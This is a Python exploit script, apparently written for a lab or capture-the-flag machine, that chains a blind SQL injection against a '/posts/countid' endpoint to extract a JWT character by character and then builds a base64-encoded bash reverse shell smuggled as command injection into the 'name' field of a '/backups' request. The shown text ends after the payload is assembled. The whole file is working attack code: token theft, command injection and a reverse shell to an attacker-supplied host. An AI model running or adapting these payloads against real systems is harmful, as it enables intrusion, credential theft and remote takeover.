import requests
import urllib3
import json
import sys
import base64
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

session = requests.Session()
ipaddr = sys.argv[1]

def char_check(cur_char,cur_pos):
    injection = "IF((select+MID(jwt,"+str(cur_pos)+",1)+from+jwts+limit+0,1)%3dbinary("+hex(ord(cur_char))+"),+(select+id+from+jwts),0)"
    response = session.get("http://"+ipaddr+":1337/posts/countid?id="+injection)
    if response.status_code == 500:
        return True
    else:
        return False

sys.stdout.write("[+] Please Wait: \n")
sys.stdout.flush()

alpha = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '_', '.', '-']

token = ""
for i in range(1, 150):
    stop = True
    for j in alpha:
        if char_check(j,i) == True:
            stop = False
            sys.stdout.write(j)
            sys.stdout.flush()
            token=token+j
            break
    if stop == True:
        break

print('\n[+]Token: \n'+token)
print("[+]Popping shell[+]")
print('-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-')

#Payload to use against /usr/bin/mysqldump
att_ip = "192.168.xx.yy" #Replace IP
att_port = "8001" #Replace Port

#base64 encode command
cmd = "bash -i >& /dev/tcp/"+att_ip+"/"+att_port+" 0>&1"
encodeStuff = base64.b64encode(cmd.encode("utf-8"))
encodedStr = str(encodeStuff.decode('utf-8'))

#Send Payload to backups
backup = "http://192.168.xx.yy:1337/backups"
header = {"Authorization": "Bearer " +str(token) , "Content-Type": "application/json", "Connection": "close"}
data = {"name": ";echo "+encodedStr+"| base64 --decode |bash #_12_34_5679", "pwd": "passpass1"}
